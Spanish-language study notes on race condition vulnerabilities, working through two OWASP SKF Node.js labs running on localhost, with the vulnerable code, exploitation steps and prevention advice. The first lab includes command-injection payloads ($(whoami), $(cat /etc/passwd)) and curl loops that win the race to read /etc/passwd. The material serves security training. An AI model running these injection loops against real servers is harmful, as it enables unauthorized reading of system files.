
# 🏃‍♂️ **Race Condition (Condición de Carrera)**

---

## 🧠 **Parte Teórica**

Una **Race Condition** es una vulnerabilidad que ocurre cuando un sistema realiza múltiples operaciones al mismo tiempo y el comportamiento del sistema depende del orden de ejecución. Si no se gestiona correctamente, puede permitir que un atacante explote ese pequeño intervalo para manipular resultados o acceder a datos que normalmente no debería ver.

### ⚠️ ¿Por qué es peligrosa?

Cuando un recurso (como un archivo) es accedido por múltiples procesos a la vez, puede ocurrir que:

- Se lea un archivo **antes** de que se verifique su contenido.
    
- Dos usuarios escriban en el mismo archivo **simultáneamente**, sobrescribiéndose o accediendo a la información del otro.
    

---

# 🔬 Parte Práctica

---

## 🔧 **Lab 1: Condición de Carrera en ejecución de comandos**

Repositorio: `skf-labs/nodeJs/RaceCondition`

---

### 🔌 **Configuración Inicial**

```bash
cd skf-labs/nodeJs/RaceCondition
npm install       # usar --force si hay errores
npm start
```

> El servidor escuchará por el puerto **5000**

![[Pasted image 20250725225135.png]]

![[Pasted image 20250725230716.png]]

---

### 🔍 **Análisis del código (`app.js`)**

En el código fuente se ve una función que:

- **Escribe un archivo `.sh`** con un `echo` del nombre ingresado por el usuario.
    
- **Ejecuta** ese archivo.
    
- **Lee** el archivo `hello.txt` con el resultado.
    
- **Valida** que no haya inyección usando un filtro por `sed`.
    

```js
fs.writeFileSync("hello.sh", 'echo "' + person + '" > hello.txt');
exec("bash hello.sh");
return execSync("sed -n '/^echo \"[A-Za-z0-9 ]*\" > hello.txt$/p' hello.sh").toString();
```

La **condición de carrera** se encuentra entre estas dos líneas:

```js
exec("bash hello.sh");     // Ejecuta el script (con posible comando malicioso)
return valid();            // Valida si el script es limpio
```

⏱️ Entre ese **minúsculo intervalo** de tiempo, se puede leer el contenido antes de que sea validado y eliminado.

---

### 🧪 **Explotación desde el navegador**

El input visible desde la app nos permite insertar el nombre:

![[Pasted image 20250725234847.png]]

Podemos inyectar código como:

```
$(whoami)
```

Sin embargo, si usamos comandos como `$(cat /etc/passwd)` **la validación los filtra**. Pero, si actuamos justo **antes** de esa validación, podemos capturar el resultado.

---

### 🎯 **Estrategia de explotación**

#### 1. **Escucha del archivo `hello.txt`** desde el host:

```bash
while true; do cat hello.txt; done
```

#### 2. **Desde la web (cliente)**, ya que no tenemos acceso directo al archivo, podemos usar:

```bash
while true; do curl -s 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | grep -v "Default User"; echo; done
```

> Esto filtra solo los resultados personalizados y no los por defecto.

---

### 🤖 **Automatización del ataque (fuzzing)**

Simultáneamente, vamos lanzando múltiples peticiones con comandos codificados:

```bash
while true; do curl -s 'http://localhost:5000/?person=%24%28cat+%2Fetc%2Fpasswd%29&action=validate'; echo; done
```

> `%24%28...%29` es `$(...)` en URL encoding.

---

![[Pasted image 20250726002322.png]]

🧨 Como ves en la imagen, el script superior escucha y el inferior hace fuerza bruta. En uno de los intentos, logramos ver el archivo `/etc/passwd`.

---

## 💾 **Lab 2: Condición de carrera en escritura de archivo**

Repositorio: `skf-labs/nodeJs/RaceCondition-file-write`

---

### ⚙️ **Preparación del entorno**

```bash
cd nodeJs/RaceCondition-file-write
npm install
npm start
```

![[Pasted image 20250726020133.png]]

Desde la web, te sugiere que navegues a una ruta como:

```
http://localhost:5000/ejemplo
```

Esto descargará un archivo `.txt` con el texto `"ejemplo"`.

---

### 🔍 **Análisis del código (`app.js`)**

```js
fs.writeFileSync("shared-file.txt", req.params.value); // 1. Crea archivo con texto del usuario
fs.open("shared-file.txt", "r", (err, fd) => {
  let file = fs.readFileSync("shared-file.txt", "utf8");
  res.sendFile(__dirname + "/shared-file.txt");         // 2. Envía archivo al cliente
});
```

---

### ⚠️ **Dónde está la vulnerabilidad**

Aquí también hay una condición de carrera:

```js
fs.writeFileSync("shared-file.txt", req.params.value);  // Escritura
// 🔥 Entre esta línea y la siguiente, hay una ventana de oportunidad
fs.open("shared-file.txt", "r", (err, fd) => {...});     // Lectura y descarga
```

📎 Si **dos usuarios** acceden al mismo tiempo, es posible que uno descargue el contenido del otro.

---

### 💡 **Idea de explotación**

Aunque este caso no requiere [[bypass]] de validaciones, puede generar **filtraciones de datos sensibles o errores lógicos**, sobre todo si se tratara de contenido como tokens, claves temporales o archivos generados dinámicamente.

---

## 🔒 **¿Cómo prevenir Race Conditions?**

- **Sincronizar operaciones** con _locks_ o semáforos.
    
- Validar y ejecutar operaciones de forma **atómica**.
    
- Evitar usar archivos temporales compartidos por múltiples usuarios.
    
- Implementar una cola de tareas para evitar acceso simultáneo a recursos críticos.
    

---

## 📚 Referencias

- [[OWASP]] Race Condition: [https://owasp.org/www-community/attacks/Race_condition](https://owasp.org/www-community/attacks/Race_condition)
    
- Node.js Docs: [fs module](https://nodejs.org/api/fs.html)
    
